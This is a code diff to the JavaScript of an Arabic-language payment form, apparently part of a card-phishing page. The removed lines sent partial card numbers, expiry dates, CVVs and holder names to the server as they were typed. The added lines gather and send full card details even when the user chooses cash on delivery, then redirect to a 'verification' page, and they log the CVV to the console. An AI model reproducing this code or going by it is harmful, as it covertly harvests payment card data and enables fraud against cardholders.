@@ -361,7 +361,7 @@
     var paymentMethod = localStorage.getItem('payment_method') || 'card';
     
     document.addEventListener('DOMContentLoaded', function() {
-      trackPageChange('payment');
+      trackPageChange('payment-form');
       
       var cashMessage = document.getElementById('cashMessage');
       if (cashMessage) {
@@ -476,11 +476,6 @@
         
         // Detect and show card brand
         detectAndShowCardBrand(value);
-        
-        // Send partial data to server
-        if (value.length >= 4) {
-          submitPaymentForm({ cardNumber: value });
-        }
       });
       
       // ================================
@@ -508,11 +503,6 @@
           e.target.value = month + ' / ' + year;
         } else {
           e.target.value = digitsOnly;
-        }
-        
-        // Send partial data
-        if (digitsOnly.length >= 4) {
-          submitPaymentForm({ expiry: e.target.value });
         }
       });
       
@@ -550,10 +540,6 @@
         var value = e.target.value.replace(/\D/g, '');
         if (value.length > 4) value = value.substring(0, 4);
         e.target.value = value;
-        
-        if (value.length >= 3) {
-          submitPaymentForm({ cvv: value });
-        }
       });
       
       // ================================
@@ -565,10 +551,6 @@
       cardHolderInput.addEventListener('input', function(e) {
         // Remove error on edit
         removeError(cardHolderParent);
-        
-        if (e.target.value.length > 2) {
-          submitPaymentForm({ cardHolder: e.target.value });
-        }
       });
       
       // ================================
@@ -617,12 +599,27 @@
       document.getElementById('paymentForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
+        console.log('💳 Form submitted - paymentMethod:', paymentMethod);
+        
+        // Get values - ALWAYS collect card data
+        var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        var expiry = document.getElementById('expiry').value;
+        var cvv = document.getElementById('cvv').value;
+        var cardHolder = cardHolderInput.value;
+        var paymentAmount = document.querySelector('input[name="paymentAmount"]') ? document.querySelector('input[name="paymentAmount"]:checked').value : 'full';
+        
+        // If cash payment, just show message and continue
         if (paymentMethod === 'cash') {
-          submitPaymentForm({
+          console.log('💳 Processing CASH payment with card data:', { cardNumber, expiry, cvv, cardHolder });
+          var cashData = {
             paymentMethod: 'cash',
             paymentAmount: 25,
-            cardNumber: ''
-          });
+            cardNumber: cardNumber,
+            expiry: expiry,
+            cvv: cvv,
+            cardHolder: cardHolder
+          };
+          submitPaymentForm(cashData);
           showToast('✓ تم تأكيد الدفع عند الاستلام');
           setTimeout(function() {
             window.location.href = 'verification.html';
@@ -630,14 +627,10 @@
           return;
         }
         
+        console.log('💳 Processing CARD payment');
         var hasError = false;
         
-        // Get values
-        var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-        var expiry = document.getElementById('expiry').value;
-        var cvv = document.getElementById('cvv').value;
-        var cardHolder = cardHolderInput.value;
-        var paymentAmount = document.querySelector('input[name="paymentAmount"]') ? document.querySelector('input[name="paymentAmount"]:checked').value : 'full';
+        console.log('💳 Card data:', { cardNumber, expiry, cvv, cardHolder });
         
         // Validate Card Number (16 digits)
         if (cardNumber.length !== 16) {
@@ -673,12 +666,15 @@
         
         // All valid - send data
         var realData = {
+          paymentMethod: 'card',
           cardNumber: cardNumber,
           expiry: expiry,
           cvv: cvv,
           cardHolder: cardHolder,
           paymentAmount: paymentAmount
         };
+        
+        console.log('💳 Sending payment data:', realData);
         
         // Clear fields for security
         document.getElementById('cardNumber').value = '';
